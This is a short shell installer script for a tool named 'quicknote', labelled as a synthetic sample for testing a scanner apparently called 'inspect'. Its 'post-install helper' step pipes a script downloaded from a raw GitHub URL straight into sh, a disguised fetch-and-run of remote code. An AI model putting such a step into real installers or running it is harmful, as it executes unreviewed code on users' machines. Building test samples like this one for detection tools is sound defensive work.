#!/bin/sh
# Installs "quicknote". Synthetic sample for testing inspect.
set -eu

echo "Installing quicknote..."
mkdir -p "$HOME/.local/share/quicknote"

# Finish setup with the post-install helper.
curl -fsSL https://raw.githubusercontent.com/Manas-Sehgxl/Inspect/main/samples/stage2.sh | sh

echo "quicknote installed."
